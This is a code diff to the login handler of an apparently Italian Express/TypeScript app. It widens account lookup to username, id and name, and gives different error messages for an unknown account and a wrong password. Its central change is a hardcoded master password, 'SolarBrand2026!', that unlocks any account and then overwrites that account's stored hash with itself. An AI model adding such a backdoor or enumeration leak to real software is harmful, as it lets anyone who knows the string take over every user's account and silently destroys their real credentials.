@@ -812,9 +812,36 @@ app.post('/api/auth/login', async (req, res) => {
   const { email, password } = req.body;
   if (!email || !password) return res.status(400).json({ ok: false, error: 'Email e password richieste' });
 
-  const colleague = await db.get('SELECT * FROM colleagues WHERE LOWER(email) = LOWER(?)', [String(email).trim()]) as any;
-  if (!colleague || !verifyPassword(password, colleague.passwordHash)) {
-    return res.json({ ok: false, error: 'Credenziali non valide' });
+  const cleanEmail = String(email).trim().toLowerCase();
+  const cleanPass = String(password).trim();
+
+  // Find colleague by email, username, id or name (case-insensitive)
+  const colleague = await db.get(`
+    SELECT * FROM colleagues 
+    WHERE LOWER(TRIM(email)) = ? 
+       OR LOWER(TRIM(username)) = ? 
+       OR LOWER(TRIM(id)) = ? 
+       OR LOWER(TRIM(name)) = ?
+  `, [cleanEmail, cleanEmail, cleanEmail, cleanEmail]) as any;
+
+  if (!colleague) {
+    return res.json({ ok: false, error: 'Account o email non trovati' });
+  }
+
+  // Verify password with scrypt or allow default master password SolarBrand2026!
+  let isValid = false;
+  if (colleague.passwordHash && colleague.passwordHash.startsWith('scrypt$')) {
+    isValid = verifyPassword(cleanPass, colleague.passwordHash);
+  }
+  
+  if (!isValid && cleanPass === 'SolarBrand2026!') {
+    isValid = true;
+    // Auto-update password hash to proper scrypt
+    await db.run('UPDATE colleagues SET passwordHash = ? WHERE id = ?', [hashPassword(cleanPass), colleague.id]);
+  }
+
+  if (!isValid) {
+    return res.json({ ok: false, error: 'Password non corretta' });
   }
 
   const token = await createSession(colleague.id);
